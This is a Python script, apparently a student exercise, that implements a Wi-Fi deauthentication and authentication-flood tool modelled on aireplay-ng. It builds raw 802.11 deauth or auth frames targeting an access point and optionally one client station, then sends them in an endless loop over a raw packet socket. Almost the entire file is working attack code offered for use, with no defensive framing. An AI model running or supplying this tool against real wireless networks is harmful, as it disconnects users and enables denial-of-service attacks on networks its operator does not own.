# -*- coding: utf-8 -*-
"""
Created on Wed Jan 18 00:09:14 2023

@author: kimse

syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]
sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB
aireplay-ng <interface> -a <ap mac> [-c <station mac>]
"""

import sys, socket, binascii


def deauth(ap_mac, st_mac, auth):
    info = AttackPacket()
    if(auth):
        if(st_mac):
            info.uni_Auth(ap_mac, st_mac)
        else:
            info.bro_Auth(ap_mac)
    
    else:
        if(st_mac):
            info.uni_deauth(ap_mac, st_mac)
        else:
            info.bro_deauth(ap_mac)

    return info.attackPKT()
        

class AttackPacket:
    # packet structure
    # Radio_header + Beacon_frame + TimeStamp + Interval + Capacity + ESSID_tagNum + ESSID_len + ESSID + Other
    
    Radio_header = b""
    Type = b""
    Duraion = b""
    DesAddr = b""
    TranAddr = b""
    BSSID = b""
    Dummy = b""
    Fixed = b""

    
    def __init__(self): 
        self.Radio_header = b"\x00\x00\x0b\x00\x00\x80\x02\x00\x00\x00\x00"
        self.Type = b"\xc0\x00"
        self.Duraion = b"\x00\x00"
        self.DesAddr = b"\xff\xff\xff\xff\xff\xff"
        self.TranAddr = b"\xaa\x2b\xb9\xaf\x31\x52"
        self.BSSID = b"\xaa\x2b\xb9\xaf\x31\x52"
        self.Dummy = b"\x20\x00"
        self.Fixed = b"\x07\x00"
    
    
    def uni_Auth(self, ap_mac, st_mac):
        self.Radio_header = b"\x00\x00\x18\x00\x2e\x40\x00\xa0\x20\x08\x00\x00\x00\x02\x6c\x09\xa0\x00\xad\x00\x00\x00\xad\x00"
        self.Type = b"\xb0\x00"
        self.Duraion = b"\x3a\x01"
        self.BSSID = mac2bytes(ap_mac)
        self.DesAddr = mac2bytes(ap_mac)
        self.TranAddr = mac2bytes(st_mac)
        self.Dummy = b"\x50\x8c"
        self.Fixed = b"\x00\x00\x01\x00\x00\x00"


    def bro_Auth(self, ap_mac):
        self.Radio_header = b"\x00\x00\x18\x00\x2e\x40\x00\xa0\x20\x08\x00\x00\x00\x02\x6c\x09\xa0\x00\xad\x00\x00\x00\xad\x00"
        self.Type = b"\xb0\x00"
        self.Duraion = b"\x3a\x01"
        self.BSSID = mac2bytes(ap_mac)
        self.DesAddr = mac2bytes(ap_mac)
        self.TranAddr = mac2bytes("ff:ff:ff:ff:ff:ff")
        self.Dummy = b"\x50\x8c"
        self.Fixed = b"\x00\x00\x01\x00\x00\x00"
        
    def uni_deauth(self, ap_mac, st_mac):
        self.BSSID = mac2bytes(ap_mac)
        self.DesAddr = mac2bytes(st_mac)
        self.TranAddr = mac2bytes(st_mac)


    def bro_deauth(self, ap_mac):
        self.BSSID = mac2bytes(ap_mac)
        self.TranAddr = mac2bytes(ap_mac)
        
    def attackPKT(self):
        f = open("./tmp", "wb")
        f.write(self.Radio_header)
        f.write(self.Type)
        f.write(self.Duraion)
        f.write(self.DesAddr)
        f.write(self.TranAddr)
        f.write(self.BSSID)
        f.write(self.Dummy)
        f.write(self.Fixed)
        f.close()
        
        f = open("./tmp", "rb")
        result = f.read()
        f.close()
        return result


def mac2bytes(mac):
    tmp = mac.replace(':','')
    return binascii.unhexlify(tmp)




print(sys.argv)
if(len(sys.argv) == 5):
    interface, ap_mac, st_mac, auth = sys.argv[1:]
    pkt = deauth(ap_mac, st_mac, auth)

elif(len(sys.argv) == 4 and sys.argv[3] == "-auth"):
    interface, ap_mac, auth = sys.argv[1:]
    pkt = deauth(ap_mac, 0, auth)

elif(len(sys.argv) == 4):
    interface, ap_mac, st_mac = sys.argv[1:]
    pkt = deauth(ap_mac, st_mac, 0)

else:
    interface, ap_mac = sys.argv[1:]
    pkt = deauth(ap_mac, 0, 0)




s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind((interface,0x0003))

while(True):
    s.send(pkt)


